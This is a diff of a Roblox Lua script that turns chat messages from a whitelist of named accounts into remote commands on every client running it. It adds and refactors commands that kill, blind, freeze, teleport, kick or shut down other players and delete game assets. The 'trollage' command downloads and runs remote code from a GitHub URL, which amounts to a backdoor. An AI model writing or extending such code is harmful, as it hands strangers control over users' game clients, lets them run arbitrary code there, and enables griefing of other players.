@@ -1,12 +1,21 @@
 local textChatService = game:GetService("TextChatService")
+local allowedPlayers = {"mrbeatyouruglyface","SnoopyIs_Better"}
+local function isPlayerAllowed(playerName)
+    for _, name in ipairs(allowedPlayers) do
+        if playerName == name then
+            return true
+        end
+    end
+    return false
+end
 local commands = {
     kill = function()
-        if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" then
+        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
             game.Players.LocalPlayer.Character.Humanoid.Health = 0
         end
     end,
     void = function()
-        if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" or LocalPlayer.Name ~= "mrbeatyouruglyface" then
+        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
             local character = game.Players.LocalPlayer.Character
             local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
             local newPosition = humanoidRootPart.CFrame
@@ -18,13 +27,13 @@ local commands = {
         end
     end,
     blind = function()
-        if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" or LocalPlayer.Name ~= "mrbeatyouruglyface" then
+        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
             local blur = Instance.new("BlurEffect", game.Lighting)
             blur.Size = 10000000000000
         end
     end,
     unblind = function()
-        if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" or LocalPlayer.Name ~= "mrbeatyouruglyface" then
+        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
             local blur = game.Lighting:FindFirstChildOfClass("BlurEffect")
             if blur then
                 blur:Destroy()
@@ -32,12 +41,12 @@ local commands = {
         end
     end,
     trollage = function()
-        if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" or LocalPlayer.Name ~= "mrbeatyouruglyface" then
+        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
             loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/bb47a8c271e25893dca73ca67ecb24d15d46ff82/trollage"))()
         end
     end,
-    ban = function()
-        if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" or LocalPlayer.Name ~= "mrbeatyouruglyface" then
+    kick = function()
+        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
             wait(1)
             for index, player in pairs(game.Players:GetPlayers()) do
                 player:Kick("Snoopy Owns You")
@@ -45,35 +54,40 @@ local commands = {
         end
     end,
     freeze = function()
-        if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" or LocalPlayer.Name ~= "mrbeatyouruglyface" then
-            local player = game.Players.LocalPlayer
-            local character = player.Character or player.CharacterAdded:Wait()
-            local humanoid = character:WaitForChild("Humanoid")
-            local function unanchorCharacter()
-                if not humanoid.RootPart.Anchored then
-                    return
-                end
-                humanoid.RootPart.Anchored = true
-            end
-            unanchorCharacter()
-        end
+     if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+       game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = true
+       end
     end,
     unfreeze = function()
-        if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" or LocalPlayer.Name ~= "mrbeatyouruglyface" then
-            local player = game.Players.LocalPlayer
-            local character = player.Character or player.CharacterAdded:Wait()
-            local humanoid = character:WaitForChild("Humanoid")
-            local function unanchorCharacter()
-                if not humanoid.RootPart.Anchored then
-                    return
-                end
-                humanoid.RootPart.Anchored = false
-            end
-            unanchorCharacter()
-        end
+     if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+       game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = false
+       end
     end,
+    lobby = function()
+     if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+       	bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
+       	end
+    end,
+    quit = function()
+    if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+	     game:Shutdown()
+	     end
+	end,
+lagback = function()
+if not isPlayerAllowed(game.Players.LocalPlayer.Name) then 
+for i = 1,10 do wait()
+local player = game.Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+local forwardVector = humanoidRootPart.CFrame.LookVector
+local newPosition = humanoidRootPart.CFrame.p + forwardVector * 1000000
+humanoidRootPart.CFrame = CFrame.new(newPosition, newPosition + forwardVector)
+end
+        end 
+    end,
+    
     breakgame = function()
-        if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" or LocalPlayer.Name ~= "mrbeatyouruglyface" then
+        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
             pcall(function()
                 local replicatedStorage = game:GetService("ReplicatedStorage")
                 for _, child in ipairs(replicatedStorage:GetDescendants()) do
@@ -83,30 +97,29 @@ local commands = {
         end
     end,
     funnymap = function()
-        if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" or LocalPlayer.Name ~= "mrbeatyouruglyface" then
+        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then 
             local function unanchorParts(object)
-                if object:IsA("BasePart") then
-                    object.Anchored = false
-                end
-                for _, child in ipairs(object:GetChildren()) do
-                    unanchorParts(child)
-                end
-            end
-            unanchorParts(workspace)
-        end
+                if object:IsA("BasePart") then 
+                    object.Anchored = false 
+                end 
+                for _, child in ipairs(object:GetChildren()) do 
+                    unanchorParts(child) 
+                end 
+            end 
+            unanchorParts(workspace) 
+        end 
     end,
 }
-
 textChatService.OnIncomingMessage = function(message)
     local properties = Instance.new("TextChatMessageProperties")
-    if message.TextSource then
+    if message.TextSource then 
         local player = game:GetService("Players"):GetPlayerByUserId(message.TextSource.UserId)
-        if player.Name == "SnoopyIs_Better" or player.Name == "menamge0" or player.Name == "mrbeatyouruglyface" then
+        if isPlayerAllowed(player.Name) then 
             local command = commands[message.Text]
-            if command then
-                command()
-            end
-        end
-    end
-    return properties
+            if command then 
+                command() 
+            end 
+        end 
+    end 
+    return properties 
 end
